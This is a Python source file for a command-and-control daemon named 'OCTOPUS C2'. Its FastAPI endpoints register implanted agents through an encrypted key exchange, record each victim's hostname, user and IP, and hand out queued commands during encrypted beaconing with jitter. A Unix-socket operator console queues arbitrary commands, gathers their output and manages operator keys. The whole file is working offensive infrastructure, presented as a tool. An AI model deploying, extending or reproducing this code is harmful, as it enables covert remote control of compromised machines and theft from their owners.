
import os
import sys
import json
import uuid
import base64
import socket
import threading
from datetime import datetime
from typing import Dict, Any

try:
    from fastapi import FastAPI, Request, HTTPException
    from fastapi.responses import JSONResponse
    import uvicorn
    FASTAPI_OK = True
except ImportError:
    FASTAPI_OK = False

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from core.c2.crypto_engine import C2CryptoEngine
from core.c2.db_backend import C2Database
from core.c2.event_store import EventStore
from core.c2.operators import OperatorManager

# ─── Configuration ───────────────────────────────────────
BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
DATA_DIR = os.path.join(BASE_DIR, "data")
KEY_DIR  = os.path.join(DATA_DIR, "keys")
DB_PATH  = os.path.join(DATA_DIR, "c2.db")
SOCK_FILE = "/tmp/octopus.sock"

# Ensure directories exist BEFORE initializing components
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(KEY_DIR, exist_ok=True)

# ─── Initialize Components ──────────────────────────────
crypto = C2CryptoEngine(key_dir=KEY_DIR)
db = C2Database(db_path=DB_PATH)
events = EventStore(db_path=DB_PATH)
operators = OperatorManager(db_path=DB_PATH)

if not FASTAPI_OK:
    print("[!] FATAL: fastapi/uvicorn not installed.  pip install fastapi uvicorn")
    sys.exit(1)

app = FastAPI(title="OCTOPUS C2 Daemon", version="11.0", docs_url=None, redoc_url=None)


# ─── Event Handlers (Projections) ────────────────────────

def _on_agent_registered(event):
    """Projection: update agents table from registration event."""
    p = event.payload
    db.update_agent(
        agent_id=p["agent_id"],
        hostname=p.get("hostname", "Unknown"),
        os_name=p.get("os", "Unknown"),
        user=p.get("user", "Unknown"),
        ip=p.get("ip", "Unknown"),
        crypto_state=p.get("crypto_state")
    )

def _on_task_queued(event):
    """Projection: insert task into tasks table."""
    p = event.payload
    db.queue_task(p["task_id"], p["agent_id"], p["command"])

def _on_task_completed(event):
    """Projection: update task result."""
    p = event.payload
    db.update_task_result(p["task_id"], p.get("output", ""), p.get("error", ""))

# Subscribe handlers
events.subscribe("agent.registered", _on_agent_registered)
events.subscribe("task.queued", _on_task_queued)
events.subscribe("task.completed", _on_task_completed)


# ─── Agent-Facing HTTP Endpoints ─────────────────────────

def _load_agent_crypto(agent_id: str) -> bool:
    """Load crypto state from DB into memory if daemon restarted."""
    if agent_id not in crypto.agent_state:
        state = db.get_agent_crypto(agent_id)
        if state and "key" in state:
            crypto.agent_state[agent_id] = {
                "key": bytes.fromhex(state["key"]),
                "rx_seq": state.get("rx_seq", 0),
                "tx_seq": state.get("tx_seq", 0),
            }
            return True
        return False
    return True


@app.post("/register")
async def register_agent(request: Request):
    """X25519 Registration endpoint with HKDF key derivation."""
    body = await request.json()
    b64_client_pub = body.get("client_pub")
    encrypted_data = body.get("data")

    if not b64_client_pub or not encrypted_data:
        raise HTTPException(status_code=400, detail="Missing crypto payload")

    try:
        client_pub_bytes = base64.b64decode(b64_client_pub)
        shared_key = crypto.derive_shared_key(client_pub_bytes)  # Now uses HKDF

        # Temp state for initial decryption
        crypto.agent_state["temp_id"] = {"key": shared_key, "rx_seq": 0, "tx_seq": 0}

        raw_data = crypto.decrypt_aes_gcm("temp_id", encrypted_data)
        data = json.loads(raw_data)
        real_agent_id = data.get("agent_id")

        # Move crypto state to real agent ID
        crypto.agent_state[real_agent_id] = crypto.agent_state.pop("temp_id")

        # Publish event (state is built from this)
        events.append("agent", real_agent_id, "agent.registered", {
            "agent_id": real_agent_id,
            "hostname": data.get("hostname"),
            "os": data.get("os"),
            "user": data.get("user"),
            "ip": request.client.host,
            "crypto_state": {
                "key": shared_key.hex(),
                "rx_seq": 0,
                "tx_seq": 0,
            }
        })

        resp_data = {"status": "ok", "interval": 60, "jitter": 20}
        resp_enc = crypto.encrypt_aes_gcm(real_agent_id, json.dumps(resp_data))
        return {"data": resp_enc}

    except Exception as e:
        crypto.agent_state.pop("temp_id", None)
        raise HTTPException(status_code=400, detail=str(e))


@app.post("/beacon")
async def beacon(request: Request):
    """Beaconing endpoint."""
    body = await request.json()
    encrypted_data = body.get("data")

    agent_id = request.headers.get("Agent-ID")
    if not agent_id or not _load_agent_crypto(agent_id):
        raise HTTPException(status_code=401, detail="Agent not found")

    try:
        raw = crypto.decrypt_aes_gcm(agent_id, encrypted_data)
        decrypted = json.loads(raw)

        # Publish beacon event
        events.append("agent", agent_id, "agent.beacon", {
            "ip": request.client.host,
        })

        # Sync crypto state to DB
        state = crypto.agent_state[agent_id]
        db.update_agent(
            agent_id=agent_id,
            hostname=decrypted.get("hostname", "Unknown"),
            os_name="Unknown", user="Unknown",
            ip=request.client.host,
            crypto_state={"key": state["key"].hex(), "rx_seq": state["rx_seq"], "tx_seq": state["tx_seq"]}
        )

        # Process results
        if "results" in decrypted and decrypted["results"]:
            for res in decrypted["results"]:
                events.append("task", res["task_id"], "task.completed", {
                    "task_id": res["task_id"],
                    "output": res.get("output", ""),
                    "error": res.get("error", ""),
                })

        pending = db.get_pending_tasks(agent_id)

        resp_data = {"tasks": pending}
        resp_enc = crypto.encrypt_aes_gcm(agent_id, json.dumps(resp_data))
        return {"data": resp_enc}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


# ─── Operator IPC Control Plane ──────────────────────────

def handle_client(conn):
    """Handle IPC requests from octopus.py thin client."""
    try:
        while True:
            data = conn.recv(8192)
            if not data:
                break

            req = json.loads(data.decode('utf-8'))
            action = req.get("action")
            api_key = req.get("api_key", "")

            # Authenticate
            operator = operators.authenticate(api_key)
            if not operator and action != "ping":
                resp = {"status": "error", "msg": "Authentication failed"}
                conn.sendall(json.dumps(resp).encode('utf-8'))
                continue

            # Authorize
            if operator and not operators.authorize(operator, action):
                resp = {"status": "error", "msg": f"Permission denied: {operator['role']} cannot {action}"}

                # Audit denied action
                events.append("operator", operator["operator_id"], "operator.denied", {
                    "action": action,
                    "operator": operator["name"],
                    "role": operator["role"],
                })

                conn.sendall(json.dumps(resp).encode('utf-8'))
                continue

            # ─── Actions ─────────────────────────────
            if action == "ping":
                resp = {"status": "ok", "msg": "pong", "version": "10.0"}

            elif action == "list_agents":
                agents_list = db.get_all_agents()
                agents_dict = {a["agent_id"]: a for a in agents_list}
                resp = {"status": "ok", "agents": agents_dict}

            elif action == "queue_task":
                agent_id = req.get("agent_id")
                command = req.get("command")

                if db.get_agent_crypto(agent_id):
                    task_id = str(uuid.uuid4())[:8]

                    # Publish event (projection handles DB insert)
                    events.append("task", task_id, "task.queued", {
                        "task_id": task_id,
                        "agent_id": agent_id,
                        "command": command,
                        "operator": operator["name"] if operator else "unknown",
                    })

                    resp = {"status": "ok", "task_id": task_id}
                else:
                    resp = {"status": "error", "msg": "Agent not found"}

            elif action == "get_results":
                agent_id = req.get("agent_id")
                results = db.get_results(agent_id)
                resp = {"status": "ok", "results": results}

            elif action == "manage_operators":
                sub_action = req.get("sub_action")
                if sub_action == "list":
                    resp = {"status": "ok", "operators": operators.list_operators()}
                elif sub_action == "create":
                    name = req.get("name")
                    role = req.get("role", "operator")
                    try:
                        new_key = operators.create_operator(name, role)
                        resp = {"status": "ok", "api_key": new_key}
                    except Exception as e:
                        resp = {"status": "error", "msg": str(e)}
                elif sub_action == "deactivate":
                    name = req.get("name")
                    if operators.deactivate_operator(name):
                        resp = {"status": "ok"}
                    else:
                        resp = {"status": "error", "msg": "Operator not found"}
                elif sub_action == "rotate_key":
                    name = req.get("name")
                    new_key = operators.rotate_api_key(name)
                    if new_key:
                        resp = {"status": "ok", "api_key": new_key}
                    else:
                        resp = {"status": "error", "msg": "Operator not found"}
                else:
                    resp = {"status": "error", "msg": f"Unknown sub_action: {sub_action}"}

            else:
                resp = {"status": "error", "msg": f"Unknown action: {action}"}

            # Audit successful action
            if operator and action != "ping":
                events.append("operator", operator["operator_id"], "operator.action", {
                    "action": action,
                    "operator": operator["name"],
                })

            conn.sendall(json.dumps(resp).encode('utf-8'))
    except Exception as e:
        print(f"[IPC] Socket error: {e}")
    finally:
        conn.close()


def run_socket_server():
    """Unix Domain Socket control plane."""
    # Remove stale socket
    if os.path.exists(SOCK_FILE):
        try:
            # Test if something is actually listening
            test_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            test_sock.settimeout(1)
            test_sock.connect(SOCK_FILE)
            test_sock.close()
            # Something is listening — another daemon is running
            print(f"[!] Another daemon is already listening on {SOCK_FILE}")
            sys.exit(1)
        except (ConnectionRefusedError, OSError):
            # Stale socket — safe to remove
            os.remove(SOCK_FILE)

    server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    server.bind(SOCK_FILE)
    server.listen(5)
    os.chmod(SOCK_FILE, 0o600)

    print(f"[*] Control Plane listening on {SOCK_FILE}")
    while True:
        conn, _ = server.accept()
        threading.Thread(target=handle_client, args=(conn,), daemon=True).start()


# ─── Main ────────────────────────────────────────────────

def main():
    # Ensure at least one operator exists (bootstrap)
    if not operators.list_operators():
        print("[*] No operators found — creating default admin...")
        try:
            admin_key = operators.create_operator("admin", "admin")
            key_file = os.path.join(DATA_DIR, "default_admin.key")
            with open(key_file, "w") as f:
                f.write(admin_key)
            os.chmod(key_file, 0o600)
            print(f"[+] Admin operator created. Key saved to {key_file}")
        except Exception as e:
            print(f"[!] Warning: Could not create default operator: {e}")

    sock_thread = threading.Thread(target=run_socket_server, daemon=True)
    sock_thread.start()

    print("[*] Starting OCTOPUS C2 Daemon v11.0 on 0.0.0.0:8443")
    print(f"[*] Event Store: {DB_PATH}")
    print(f"[*] RBAC: {len(operators.list_operators())} operator(s)")

    try:
        uvicorn.run(app, host="0.0.0.0", port=8443, log_level="warning")
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"[!] Port 8443 already in use. Kill existing process or change port.")
        else:
            raise


if __name__ == "__main__":
    main()
